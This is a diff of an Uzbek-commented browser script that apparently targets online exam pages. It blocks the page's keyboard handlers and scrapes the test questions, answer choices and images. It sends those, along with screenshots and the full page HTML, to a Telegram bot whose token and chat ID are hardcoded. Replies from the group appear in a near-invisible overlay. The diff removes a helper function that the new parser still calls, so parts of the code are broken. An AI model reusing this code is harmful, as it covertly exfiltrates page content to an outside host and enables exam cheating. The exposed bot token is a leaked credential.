@@ -3,18 +3,22 @@ const telegramToken = '7899262150:AAH7nPkrrjXP1YZ6FJuxKV450X_LNv-VdQg'; // BOT T
 const chatId = '-4925300420'; // MAQSADLI GURUH CHAT_ID SINI KIRITING (minus bilan)
 let lastProcessedUpdateId = 0;
 
-// == Sichqonchaning o'ng tugmasini BOSIB TURISH uchun sozlamalar ==
-let rightClickHoldTimer = null;
+// == "Bosib turish" sozlamalari ==
+let holdTimer = null;
 let elementUnderCursor = null;
-const RIGHT_CLICK_HOLD_DURATION = 5000; // 5 soniya (bosib turish uchun)
+const HOLD_DURATION = 1200; // 1.2 soniya
 
-// == Sichqonchaning o'ng tugmasini KETMA-KET BOSISH uchun sozlamalar ==
-let rightClickTapCount = 0;
-let lastRightClickTapTime = 0;
-const MULTI_CLICK_TAP_THRESHOLD = 700; // Ketma-ket bosishlar orasidagi maksimal vaqt (ms)
-const REQUIRED_TAPS_FOR_BODY_SEND = 5; // Sahifa matnini yuborish uchun kerakli bosishlar soni
+// == Sahifadagi klaviatura hodisalarini o'chirish (jQuery talab qiladi) ==
+try {
+    if ($) {
+        $(document).off('keydown keypress keyup');
+        $(window).off('keydown keypress keyup');
+    }
+} catch (e) {
+    console.warn("jQuery topilmadi, klaviatura bloklanmadi.");
+}
 
-// == html2canvas yuklash ==
+// == Boshlang'ich skriptlarni yuklash ==
 function loadHtml2Canvas() {
     return new Promise((resolve, reject) => {
         if (window.html2canvas) return resolve();
@@ -26,245 +30,280 @@ function loadHtml2Canvas() {
     });
 }
 
-// == Skrinshotni yuborish ==
-async function screenshotAndSend() {
-    try {
-        await loadHtml2Canvas();
-        updateMiniWindow("Skrinshot tayyorlanmoqda...");
-        html2canvas(document.body, { scale: 2 }).then(canvas => {
-            canvas.toBlob(async blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId); // Ikkinchi skriptdagi chatId ishlatiladi
-                formData.append('document', blob, 'screenshot.png');
+// == Mini-oyna ==
+function createMiniWindow() {
+    const miniWindowHTML = `
+    <div id="mini-window" style="display: none;">
+        <div id="mini-window-content">--</div>
+    </div>`;
+    document.body.insertAdjacentHTML('beforeend', miniWindowHTML);
 
-                const res = await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, { // Ikkinchi skriptdagi telegramToken ishlatiladi
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (!res.ok) {
-                    const errorText = await res.text();
-                    updateMiniWindow(`Xato (skrinshot yuborish): ${errorText}`);
-                } else {
-                    updateMiniWindow('Skrinshot muvaffaqiyatli yuborildi.');
-                }
-            }, 'image/png');
-        });
-    } catch (error) {
-        updateMiniWindow(`Skrinshot olishda xato: ${error.message}`);
+    const style = document.createElement('style');
+    style.innerHTML = `
+    #mini-window {
+        position: fixed;
+        bottom: 10px;
+        right: 10px;
+        width: 200px;
+        height: 200px;
+        background: rgba(255, 255, 255, 0);
+        border: none;
+        border-radius: 5px;
+        overflow-y: auto;
+        z-index: 2147483647;
+        font-family: Arial, sans-serif;
     }
+    #mini-window::-webkit-scrollbar { width: 6px; }
+    #mini-window::-webkit-scrollbar-thumb { background-color: rgba(255, 255, 255, 0.3); border-radius: 10px; }
+    #mini-window::-webkit-scrollbar-thumb:hover { background-color: rgba(255, 255, 255, 0.5); }
+    #mini-window::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0); border-radius: 5px; }
+    #mini-window-content { padding: 5px; font-size: 14px; line-height: 1.5; color: rgba(204, 204, 204, 0.75); }`;
+    document.head.appendChild(style);
 }
 
-
-// == Asosiy funksiyalar ==
-function extractImageLinks(element) {
-    if (!element) return '';
-    const images = element.querySelectorAll('img');
-    return Array.from(images).map(img => img.src).filter(src => src).join('\n');
+function appendMessageToMiniWindow(message) {
+    const content = document.getElementById('mini-window-content');
+    if (!content) return;
+    if (content.textContent.trim() === "--" && content.firstChild?.nodeType === Node.TEXT_NODE) {
+        content.innerHTML = '';
+    }
+    const msgEl = document.createElement('p');
+    msgEl.textContent = message;
+    content.appendChild(msgEl);
+    content.scrollTop = content.scrollHeight;
 }
 
-async function sendQuestionToTelegram(questionText) {
+function toggleMiniWindow() {
+    const win = document.getElementById('mini-window');
+    if (!win) return;
+    win.style.display = win.style.display === 'none' ? 'block' : 'none';
+}
+
+// == Telegram bilan ishlash funksiyalari ==
+async function sendMessageToTelegram(text) {
     const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
     try {
         const response = await fetch(url, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json', },
-            body: JSON.stringify({ chat_id: chatId, text: questionText, parse_mode: 'HTML' }),
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' }),
         });
-        const responseData = await response.json();
         if (!response.ok) {
-            updateMiniWindow(`Xato (yuborish): ${responseData.description || 'Noma\'lum xato'}`);
-        } else {
-            // Muvaffaqiyatli yuborish haqida mini-oynaga xabar berilmaydi (oldin ham yo'q edi)
+            const errorData = await response.json();
+            console.error(`Xato (yuborish): ${errorData.description}`);
         }
     } catch (error) {
-        updateMiniWindow(`Fetch xatosi (yuborish): ${error.message}`);
+        console.error(`Tarmoq xatosi: ${error.message}`);
+    }
+}
+
+async function screenshotAndSend() {
+    try {
+        await loadHtml2Canvas();
+        console.log("Skrinshot olinmoqda...");
+const canvas = await html2canvas(document.body, { scale: 1.5, useCORS: true });
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('document', blob, 'screenshot.png');
+            formData.append('caption', `Sahifa manzili: ${window.location.href}`);
+
+            console.log("Skrinshot yuborilmoqda...");
+            const res = await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (res.ok) {
+                console.log('Skrinshot muvaffaqiyatli yuborildi.');
+            } else {
+                const errorText = await res.text();
+                console.error(`Xato (skrinshot): ${errorText}`);
+            }
+        }, 'image/png');
+    } catch (error) {
+        console.error(`Skrinshotda xato: ${error.message}`);
+    }
+}
+
+// == Sahifani HTML fayl qilib yuborish (YANGI FUNKSIYA) ==
+async function sendPageAsHtmlFile() {
+    try {
+        console.log("HTML fayl tayyorlanmoqda...");
+        const htmlContent = document.documentElement.outerHTML;
+        const htmlBlob = new Blob([htmlContent], { type: 'text/html' });
+
+        // Fayl nomini sahifa sarlavhasidan olish va tozalash
+        const fileName = (document.title || 'page').replace(/[^a-z0-9]/gi, '_').toLowerCase() + '.html';
+
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('document', htmlBlob, fileName);
+        formData.append('caption', `Sahifaning HTML fayli:\n${window.location.href}`);
+
+        console.log("HTML fayl yuborilmoqda...");
+        const res = await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, {
+            method: 'POST',
+            body: formData
+        });
+
+        if (res.ok) {
+            console.log('HTML fayl muvaffaqiyatli yuborildi.');
+        } else {
+            const errorText = await res.text();
+            console.error(`Xato (HTML fayl): ${errorText}`);
+        }
+    } catch (error) {
+        console.error(`HTML faylni yuborishda xato: ${error.message}`);
     }
 }
 
 async function getNewAnswersFromTelegram() {
-    const url = `https://api.telegram.org/bot${telegramToken}/getUpdates?offset=${lastProcessedUpdateId + 1}&timeout=20&allowed_updates=["message","channel_post"]`;
+    const url = `https://api.telegram.org/bot${telegramToken}/getUpdates?offset=${lastProcessedUpdateId + 1}&timeout=30`;
     try {
         const response = await fetch(url);
-        if (!response.ok) { /* Xato haqida mini-oynaga xabar berilmaydi */ return; }
+        if (!response.ok) return;
         const data = await response.json();
         if (data.ok && data.result) {
             data.result.forEach(update => {
-                const message = update.message || update.channel_post;
+                const message = update.message;
                 const updateId = update.update_id;
-                if (message && message.text && message.chat && message.chat.id.toString() === chatId && updateId > lastProcessedUpdateId) {
+                if (message && message.text && updateId > lastProcessedUpdateId) {
                     lastProcessedUpdateId = updateId;
-                    updateMiniWindow(`Javob: ${message.text}`);
+                    appendMessageToMiniWindow(message.text);
                 } else if (updateId > lastProcessedUpdateId) {
                     lastProcessedUpdateId = updateId;
                 }
             });
-        } else if (!data.ok) { /* API xatosi haqida mini-oynaga xabar berilmaydi */ }
-    } catch (error) { /* Fetch xatosi haqida mini-oynaga xabar berilmaydi */ }
-}
-
-function updateMiniWindow(message) {
-    const miniWindowContent = document.getElementById('mini-window-content');
-    if (!miniWindowContent) { return; }
-    const messageElement = document.createElement('p');
-    messageElement.textContent = message;
-    if (miniWindowContent.textContent.trim() === "--" && miniWindowContent.firstChild?.nodeType === Node.TEXT_NODE) {
-        miniWindowContent.innerHTML = ''; // Boshlang'ich "--" matnini tozalash
-    }
-    miniWindowContent.appendChild(messageElement);
-    miniWindowContent.scrollTop = miniWindowContent.scrollHeight;
-}
-
-setInterval(getNewAnswersFromTelegram, 2000);
-
-function toggleMiniWindow() {
-    const miniWindow = document.getElementById('mini-window');
-    if (!miniWindow) return;
-    if (miniWindow.style.display === 'none' || miniWindow.style.display === '') {
-        miniWindow.style.display = 'block';
-        getNewAnswersFromTelegram();
-    } else {
-        miniWindow.style.display = 'none';
-    }
-}
-
-function findMeaningfulBlock(clickedElement) {
-    if (!clickedElement) return null;
-    let candidate = clickedElement.closest('p, div, article, section, li, h1, h2, h3, h4, h5, h6, span, td, th');
-    if (candidate && candidate.textContent.trim().length > 10) {
-        if (candidate.offsetHeight > window.innerHeight * 0.7 || candidate.offsetWidth > window.innerWidth * 0.7) {
-            if (clickedElement.textContent.trim().length > 10) return clickedElement;
         }
+    } catch (error) { /* Konsolga chiqarilmaydi */ }
+}
+
+// == Elementni topish va yuborish ==
+function findMeaningfulBlock(element) {
+    if (!element) return null;
+    let candidate = element.closest('p, div, li, h1, h2, h3, span, td, .test-question, .answers-test');
+    if (candidate && candidate.textContent.trim().length > 10) {
         return candidate;
     }
-    if (clickedElement.textContent.trim().length > 5) { return clickedElement; }
-    return null;
+    return element.textContent.trim().length > 5 ? element : null;
 }
 
-async function handleRightMouseDownToHold(event) {
-    if (event.button === 2) {
-        elementUnderCursor = event.target;
-        if (rightClickHoldTimer) { clearTimeout(rightClickHoldTimer); }
-        rightClickHoldTimer = setTimeout(async () => {
-            if (elementUnderCursor) {
-                const questionBlock = findMeaningfulBlock(elementUnderCursor);
-                if (questionBlock) {
-                    const questionText = questionBlock.textContent?.trim();
-                    if (questionText) {
-                        const safeQuestionText = questionText.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-                        const messageToSend = `<b>Tanlangan savol (bosib turish):</b>\n<pre>${safeQuestionText}</pre>`;
-                        await sendQuestionToTelegram(messageToSend);
-                        updateMiniWindow("Tanlangan savol yuborildi."); // Qisqa xabar
-                    } else { updateMiniWindow("Xato: Matn olinmadi (bosib turish)."); }
-                } else { updateMiniWindow("Xato: Blok topilmadi (bosib turish)."); }
-            }
-            elementUnderCursor = null; rightClickHoldTimer = null;
-        }, RIGHT_CLICK_HOLD_DURATION);
-    }
-}
-
-function handleRightMouseUpToHold(event) {
-    if (event.button === 2) {
-        if (rightClickHoldTimer) { clearTimeout(rightClickHoldTimer); rightClickHoldTimer = null; }
-        elementUnderCursor = null;
-    }
-}
-
-async function sendBodyContent() {
-    const bodyText = document.body.innerText;
-    if (bodyText && bodyText.trim().length > 0) {
-        const safeBodyText = bodyText.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-        const message = `<b>Sahifa matni (${REQUIRED_TAPS_FOR_BODY_SEND} bosish):</b>\n<pre>${safeBodyText.substring(0, 3800)}</pre>`;
-        await sendQuestionToTelegram(message);
-        updateMiniWindow("Sahifa matni yuborildi."); // Qisqa xabar
-    } else { updateMiniWindow("Xato: Sahifada matn yo'q."); }
-}
-
-document.addEventListener("keyup", (event) => {
-    const key = event.key.toLowerCase();
-    if (key === "m") {
-        toggleMiniWindow();
-    }
-    if (key === "x") { // 'x' tugmasi skrinshot uchun
+// == Hodisalarni (events) qayta ishlash ==
+document.addEventListener('keyup', e => {
+    const key = e.key.toLowerCase();
+    if (key === 'x') {
         screenshotAndSend();
     }
-});
-
-document.addEventListener("contextmenu", (event) => {
-    event.preventDefault();
-    const currentTime = new Date().getTime();
-    if (currentTime - lastRightClickTapTime < MULTI_CLICK_TAP_THRESHOLD) { rightClickTapCount++; }
-    else { rightClickTapCount = 1; }
-    lastRightClickTapTime = currentTime;
-    if (rightClickTapCount >= REQUIRED_TAPS_FOR_BODY_SEND) {
-        sendBodyContent(); rightClickTapCount = 0; lastRightClickTapTime = 0;
-    } else if (rightClickTapCount === 1) { toggleMiniWindow(); }
-});
-
-document.addEventListener('mousedown', handleRightMouseDownToHold);
-document.addEventListener('mouseup', handleRightMouseUpToHold);
-
-// == Mini oyna HTML va CSS ==
-const miniWindowHTML = `
-    <div id="mini-window" style="display: none;">
-        <div id="mini-window-content">--</div>
-    </div>
-`;
-
-const styleElement = document.createElement('style');
-styleElement.innerHTML = `
-#mini-window {
-    position: fixed; bottom: 10px; right: 10px; width: 200px; height: 200px;
-    background: rgba(255, 255, 255, 0); border: none; border-radius: 5px;
-    overflow-y: auto; z-index: 2147483647; font-family: Arial, sans-serif;
-}
-#mini-window::-webkit-scrollbar { width: 6px; }
-#mini-window::-webkit-scrollbar-thumb { background-color: rgba(255, 255, 255, 0.3); border-radius: 10px; }
-#mini-window::-webkit-scrollbar-thumb:hover { background-color: rgba(255, 255, 255, 0.5); }
-#mini-window::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0); border-radius: 5px; }
-#mini-window-content {
-    padding: 5px; font-size: 14px; line-height: 1.5;
-    max-height: calc(100% - 0px);
-    color: rgba(204, 204, 204, 0.75); word-wrap: break-word;
-}
-`;
-document.head.appendChild(styleElement);
-document.body.insertAdjacentHTML('beforeend', miniWindowHTML);
-
-async function processAndSendQuestions() {
-    const testElements = document.querySelectorAll('.test-table'); // SELEKTORNI MOSLASHTIRING
-    if (testElements.length === 0) {
-        updateMiniWindow("Xato: Savollar topilmadi (selektor)."); return;
+    if (key === 'm') {
+        toggleMiniWindow();
     }
-    const sortedTests = Array.from(testElements).sort((a,b)=>(parseInt(a.id?.replace(/\D/g,'')||'0')-parseInt(b.id?.replace(/\D/g,'')||'0')));
-    updateMiniWindow(`${sortedTests.length} savol topildi...`);
+    // 'h' tugmasi sahifani .html fayl qilib yuborish uchun (YANGI)
+    if (key === 'h') {
+        sendPageAsHtmlFile();
+    }
+});
+
+document.addEventListener('mousedown', (e) => {
+    if (e.button === 2) { // O'ng tugma
+        elementUnderCursor = e.target;
+        holdTimer = setTimeout(async () => {
+            if (elementUnderCursor) {
+                const block = findMeaningfulBlock(elementUnderCursor);
+                if (block) {
+                    const text = block.textContent?.trim();
+                    const images = Array.from(block.querySelectorAll('img')).map(img => img.src).join('\n');
+                    if (text || images) {
+                        let messageToSend = `<b>Tanlangan blok (bosib turish):</b>\n<pre>${text.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
+                        if (images) {
+                            messageToSend += `\n\n<b>Blokdagi rasmlar:</b>\n${images}`;
+                        }
+                        await sendMessageToTelegram(messageToSend);
+                        console.log("Tanlangan blok yuborildi.");
+                    }
+                }
+            }
+            holdTimer = null;
+        }, HOLD_DURATION);
+    }
+});
+
+document.addEventListener('mouseup', (e) => {
+    if (e.button === 2 && holdTimer) {
+        clearTimeout(holdTimer);
+        holdTimer = null;
+    }
+});
+
+document.addEventListener('contextmenu', (e) => {
+    if (!holdTimer) {
+        e.preventDefault();
+        toggleMiniWindow();
+    }
+});
+
+// == Asosiy savol-javob parseri ==
+// == Asosiy savol-javob parseri (Tuzatilgan versiya) ==
+async function processAndSendQuestions() {
+    // Sahifadan .table-test klassiga ega barcha elementlarni topish
+    const tests = document.querySelectorAll('.table-test');
+    if (tests.length === 0) {
+        console.warn("Savollar topilmadi (.table-test selektori bo'yicha).");
+        return;
+    }
+    console.log(`${tests.length} ta savol topildi. Yuborilmoqda...`);
+
+    // Elementlarni ID raqami bo'yicha saralash
+    const sortedTests = Array.from(tests).sort((a, b) => {
+        const idA = parseInt(a.id.replace(/\D/g, ''), 10) || 0;
+        const idB = parseInt(b.id.replace(/\D/g, ''), 10) || 0;
+        return idA - idB;
+    });
+
     for (let i = 0; i < sortedTests.length; i++) {
         const test = sortedTests[i];
-        let msg = `<b>Savol ${i+1}/${sortedTests.length}:</b>\n`;
-        const qEl = test.querySelector('.test-question'); // SELEKTORNI MOSLASHTIRING
-        msg += `${qEl?.textContent?.trim()||'Savol matni yo\'q'}\n\n`;
-        const qImgs = extractImageLinks(qEl);
-        if (qImgs) { msg += `Savol rasmlari:\n${qImgs}\n\n`; }
-        const ansEls = test.querySelectorAll('.test-answers li'); // SELEKTORNI MOSLASHTIRING
-        let ansTxt = Array.from(ansEls).map((li,idx)=>{
-            const vEl = li.querySelector('.test-variant'); // SELEKTORNI MOSLASHTIRING
-            const vari = vEl?.textContent?.trim()||String.fromCharCode(65+idx);
-            let aTxt = ''; const lblEl = li.querySelector('label'); // SELEKTORNI MOSLASHTIRING
-            if(lblEl){ const clone=lblEl.cloneNode(true); const vInL=clone.querySelector('.test-variant'); if(vInL)vInL.remove(); aTxt=clone.textContent?.trim(); }
-            else{ aTxt=li.textContent?.replace(vari,'').trim(); }
-            const aImg = extractImageLinks(li); return `${vari}. ${aTxt}${aImg?` (Rasm: ${aImg})`:''}`;
-        }).join('\n');
-        if(ansEls.length>0){ msg+='Javob variantlari:\n'+ansTxt; } else { msg+='Javob variantlari yo\'q.'; }
-        await sendQuestionToTelegram(msg);
-        await new Promise(r => setTimeout(r, 350+Math.random()*300));
+        
+        // Savol matnini va rasmlarini olish
+        const questionElement = test.querySelector('.test-question');
+        const questionText = questionElement?.querySelector('p')?.textContent.trim() || 'Savol matni topilmadi';
+        const questionImages = extractImageLinks(questionElement);
+
+        // Xabarni HTML formatida tayyorlash
+        let messageContent = `<b>Savol ${i + 1}/${sortedTests.length}:</b>\n${questionText}\n\n`;
+        if (questionImages) {
+            messageContent += `<i>Savol rasmlari:</i>\n${questionImages}\n\n`;
+        }
+        
+        // Javob variantlarini olish
+        const answers = Array.from(test.querySelectorAll('.answers-test li')).map(li => {
+            const variant = li.querySelector('.test-variant')?.textContent.trim() || '';
+            const answerText = li.querySelector('label p')?.textContent.trim() || '';
+            const answerImage = extractImageLinks(li);
+            return `${variant}. ${answerText} ${answerImage ? `(Rasm: ${answerImage})` : ''}`;
+        });
+
+        if (answers.length > 0) {
+            messageContent += '<b>Javob variantlari:</b>\n' + answers.join('\n');
+        }
+
+        // Tayyor xabarni yuborish
+        await sendMessageToTelegram(messageContent);
+        // Telegram API bloklamasligi uchun kichik pauza
+        await new Promise(r => setTimeout(r, 500));
     }
-    updateMiniWindow("Savollar muvaffaqiyatli yuborildi."); // Qisqa xabar
+    console.log("Barcha savollar muvaffaqiyatli yuborildi.");
 }
 
-function initializeMainScript() {
-    updateMiniWindow("Skript ishga tushdi...");
-    setTimeout(() => { processAndSendQuestions(); }, 1000);
+// == Skriptni ishga tushirish ==
+function main() {
+    createMiniWindow();
+    console.log("Skript ishga tushdi. 'h' - HTML yuborish, 'x' - skrinshot, 'm' - oyna.");
+    setInterval(getNewAnswersFromTelegram, 3000);
+    
+    // Sahifa yuklangandan keyin avtomatik savollarni yuborish (agar kerak bo'lsa)
+     setTimeout(() => {
+         processAndSendQuestions();
+     }, 1500);
 }
 
-// Skript yuklangandan 2 soniya o'tib asosiy funksiyani ishga tushirish
-setTimeout(initializeMainScript, 2000);
+main();
